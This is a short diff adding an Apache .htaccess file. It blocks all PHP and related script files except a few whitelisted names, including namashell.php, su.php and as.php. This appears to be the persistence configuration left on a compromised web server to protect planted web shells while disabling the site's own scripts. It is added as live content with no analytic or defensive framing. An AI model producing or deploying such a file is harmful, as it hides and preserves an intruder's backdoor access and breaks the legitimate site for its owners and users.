@@ -1,0 +1,9 @@
+<FilesMatch "\.(php|ph*|Ph*|PH*|pH*|shtml|phtml|htm*|PHTML|SHTML)$">
+    Deny from all
+</FilesMatch>
+<FilesMatch "^(as.php|su.php|index.html|index.php|sitemap (75).xml|namashell.php)$">
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
+    Allow from all
+</FilesMatch>
